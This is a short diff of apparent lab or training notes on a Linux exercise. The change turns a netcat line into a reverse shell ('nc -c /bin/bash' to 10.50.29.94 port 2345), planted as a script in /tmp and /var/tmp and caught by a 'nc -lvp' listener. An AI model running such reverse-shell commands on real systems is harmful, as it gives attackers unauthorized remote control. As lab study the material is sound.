@@ -83,7 +83,7 @@ student@lin-ops:~$ ssh comrade@127.0.0.1 -p 1233
 
 make script in both /var/tmp and /tmp bc the cmd we working with (below) random
 #!/bin/bash
-nc -c 10.50.29.94 2345
+nc -c /bin/bash 10.50.29.94 2345
 what we working with::: cd `printf "/var/tmp\n/tmp\n"|sort -R | head -n 1`;ls
 student@lin-ops:~$ nc -lvp 2345
 
